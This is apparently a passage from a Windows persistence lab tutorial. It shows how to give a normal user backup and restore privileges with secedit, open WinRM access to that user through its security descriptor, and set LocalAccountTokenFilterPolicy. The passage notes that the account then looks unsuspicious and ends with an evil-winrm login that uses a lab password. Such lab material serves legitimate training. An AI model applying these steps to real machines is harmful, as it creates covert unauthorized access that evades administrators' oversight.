A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:
- **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
```powershell
secedit /export /cfg config.inf
```

We convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a **security descriptor** as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy** registry key:
```shell-session
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```
 
 Checking our user's group memberships, it will look like a regular user. Nothing suspicious at all!
```shell-session
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```

```
evil-winrm -i 10.10.6.17 -u thmuser2 -p Password321
```
